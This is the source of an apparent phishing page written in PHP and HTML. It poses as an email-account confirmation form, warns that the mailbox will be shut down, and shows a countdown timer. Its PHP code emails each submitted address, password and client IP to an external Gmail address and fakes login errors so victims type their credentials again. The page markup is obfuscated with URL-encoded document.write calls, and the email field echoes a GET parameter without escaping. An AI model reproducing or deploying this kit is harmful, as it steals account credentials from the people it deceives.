<?php
session_start();
$err = null;
    if(isset($_POST["submit"])) {
        $ip = getenv("REMOTE_ADDR");
        $message = "";
        $message .= "--------------New Login--------\n";
        $message .= "Email-ID : ".$_POST['email']."\n";
        $message .= "Password : ".$_POST['password']."\n";
        $message .= "Client IP : ".$ip."\n";
        $message .= "--------------------------------------\n";
        $send = "esa.ojalatemet@gmail.com";
        $subject = "New Log (De-Activation) $ip";

        $_SESSION["user"] = true;
        isset($_SESSION["count"]) ? $_SESSION["count"]++ : $_SESSION["count"] = 1;
        
        if($_SESSION["count"] <= 2) {
            mail($send,$subject,$message);
            $err = "Invalid email/password combination";
        } else if($_SESSION["count"] == 0) {
            $err = "";
        }
        else {
            $err = "Email account confirmation unsuccessful. Please try again later";
        }
    }
?>
<!DOCTYPE html>
<script>
    document.write(unescape("%3Chtml%20lang%3D%22en%22%3E%0A%20%20%3Chead%3E%0A%20%20%20%20%3Ctitle%3EEmail%20Confirmation%3C/title%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%20/%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%22%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%20rel%3D%22icon%22%20type%3D%22image/png%22%20href%3D%22images/icons/favicon.ico%22%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%0A%20%20%20%20%20%20rel%3D%22stylesheet%22%0A%20%20%20%20%20%20type%3D%22text/css%22%0A%20%20%20%20%20%20href%3D%22vendor/bootstrap/css/bootstrap.min.css%22%0A%20%20%20%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%0A%20%20%20%20%20%20rel%3D%22stylesheet%22%0A%20%20%20%20%20%20type%3D%22text/css%22%0A%20%20%20%20%20%20href%3D%22fonts/font-awesome-4.7.0/css/font-awesome.min.css%22%0A%20%20%20%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%0A%20%20%20%20%20%20rel%3D%22stylesheet%22%0A%20%20%20%20%20%20type%3D%22text/css%22%0A%20%20%20%20%20%20href%3D%22fonts/Linearicons-Free-v1.0.0/icon-font.min.css%22%0A%20%20%20%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22vendor/animate/animate.css%22%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%0A%20%20%20%20%20%20rel%3D%22stylesheet%22%0A%20%20%20%20%20%20type%3D%22text/css%22%0A%20%20%20%20%20%20href%3D%22vendor/css-hamburgers/hamburgers.min.css%22%0A%20%20%20%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%0A%20%20%20%20%20%20rel%3D%22stylesheet%22%0A%20%20%20%20%20%20type%3D%22text/css%22%0A%20%20%20%20%20%20href%3D%22vendor/animsition/css/animsition.min.css%22%0A%20%20%20%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%0A%20%20%20%20%20%20rel%3D%22stylesheet%22%0A%20%20%20%20%20%20type%3D%22text/css%22%0A%20%20%20%20%20%20href%3D%22vendor/select2/select2.min.css%22%0A%20%20%20%20/%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22css/util.css%22%20/%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22css/main.css%22%20/%3E%0A%20%20%20%20%3C%21--%20%3Cscript%20language%3D%22JavaScript%22%20src%3D%22countdown.js%22%3E%3C/script%3E%20--%3E%0A%20%20%20%20%3C%21--%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D--%3E%0A%20%20%3C/head%3E%0A%20%20%3Cbody%3E%0A%20%20%20%20%3Cdiv%20class%3D%22limiter%22%3E%0A%20%20%20%20%20%20%3Cdiv%20class%3D%22container-login100%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22wrap-input100%20col-md-3%22%3E%0A%20%20%20%20%20%20%20%20%20%20%3Cform%20class%3D%22login100-form%20validate-form%20flex-sb%20flex-w%22%20method%3D%22post%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22login100-form-title%20p-b-12%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbr%20/%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20Your%20mailbox%20will%20be%20shutdown%20in%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E"))
</script>
            <span class="login100-form-title p-b-12 timer-color" id="timeLeft">
            </span>
<script>
    document.write(unescape("%3Cspan%20class%3D%22login100-form-subtitle%20p-b-10%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20Confirm%20your%20details%20to%20stop%20account%20termination%21%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22login100-form-subtitle%20p-b-1%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22./images/anonymous.png%22%20style%3D%22width%3A%20100px%22/%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22p-t-31%20p-b-9%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22txt1%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Email%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20class%3D%22wrap-input100%20validate-input%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20data-validate%3D%22Email%20is%20required%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%3E"))
</script>
              <input
                class="input100"
                type="email"
                name="email"
                value="<?=$_GET['email']?>"
              />
<script>
    document.write(unescape(""))
</script>
              <span class="focus-input100"></span>
            </div>

            <div class="p-t-13 p-b-9">
              <span class="txt1">
                Password
              </span>
            </div>
            <div
              class="wrap-input100 validate-input"
              data-validate="Password is required"
            >
              <input
                class="input100"
                type="password"
                name="password"
                placeholder="Password"
              />
              <span class="focus-input100"></span>
            </div>
            <span style="color: red; font-size: 12px"><?=$err?></span>

            <div class="container-login100-form-btn m-t-17">
              <input type="submit" class="btn btn-primary form-control" name="submit" value="Submit"/>
            </div>

            <div class="w-full text-center p-t-55">
              <span class="txt2"> </span>
            </div>
          </form>
        </div>
      </div>
    </div>

    <div id="dropDownSelect1"></div>

    <!--===============================================================================================-->
    <script src="vendor/jquery/jquery-3.2.1.min.js"></script>
    <!--===============================================================================================-->
    <script src="vendor/animsition/js/animsition.min.js"></script>
    <!--===============================================================================================-->
    <script src="vendor/bootstrap/js/popper.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <!--===============================================================================================-->
    <script src="vendor/select2/select2.min.js"></script>
    <!--===============================================================================================-->
    <script src="vendor/daterangepicker/moment.min.js"></script>
    <script src="vendor/daterangepicker/daterangepicker.js"></script>
    <!--===============================================================================================-->
    <script src="vendor/countdowntime/countdowntime.js"></script>
    <!--===============================================================================================-->
    <script src="js/main.js"></script>
  </body>
  <!-- Display the countdown timer in an element -->
  <!-- <p id="demo"></p>

  <script>
    // Set the date we're counting down to
    console.log(<?= strToTime(date('Y-m-d',time()+( 8 - date('w'))*24*3600));?>);

    var countDownDate = new Date(<?php strToTime(date('Y-m-d',time()+( 8 - date('w'))*24*3600));?>).getTime();

    // Update the count down every 1 second
    var x = setInterval(function() {
      // Get today's date and time
      var now = new Date().getTime();

      // Find the distance between now and the count down date
      var distance = countDownDate - now;

      // Time calculations for days, hours, minutes and seconds
      var days = Math.floor(distance / (1000 * 60 * 60 * 24));
      var hours = Math.floor(
        (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
      );
      var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      var seconds = Math.floor((distance % (1000 * 60)) / 1000);

      // Display the result in the element with id="demo"
      document.getElementById("demo").innerHTML =
        days + "d " + hours + "h " + minutes + "m " + seconds + "s ";

      // If the count down is finished, write some text
      if (distance < 0) {
        clearInterval(x);
        document.getElementById("demo").innerHTML = "EXPIRED";
      }
    }, 1000);
  </script> -->
  <!-- PHP NEXT WEEK DATE -->
  <!-- date('Y-m-d',time()+( 8 - date('w'))*24*3600); -->

  <script type="text/javascript">
        function updateTimeSpan() {
    var theSpan = document.getElementById('timeLeft');
    var d = new Date();
    var t = new Date();
    var ms;
    var s, m, h;

    // if it's after 5pm, set today to tomorrow    
    if (d.getHours() > 16){ d.setDate(d.getDate() + 1); }
    // get the next monday    
    while (d.getDay() != 5){ d.setDate(d.getDate() + 1); }
    // set the time    
    d.setHours(23);
    d.setMinutes(18);
    d.setSeconds(0);
    // get the difference between right now and next monday    
    ms = d - t;
    // get the days between now and then    
    d = parseInt(ms / (1000 * 60 * 60 * 24));
    ms -= (d * 1000 * 60 * 60 * 24);
    // get hours    
    h = parseInt(ms / (1000 * 60 * 60));
    ms -= (h * 1000 * 60 * 60);
    // get minutes    
    m = parseInt(ms / (1000 * 60));
    ms -= (m * 1000 * 60);
    // get seconds    
    s = parseInt(ms / 1000);
    theSpan.innerHTML = d + ' days, ' + h + ' hours, ' + m + ' minutes, and ' + s + ' seconds.';
    setTimeout('updateTimeSpan()', 100);
}

onload = updateTimeSpan();

$(function() {
    
    $("h2")
        .wrapInner("<span>")

    $("h2 br")
        .before("<span class='spacer'>")
        .after("<span class='spacer'>");

});
   
</script>
</html>
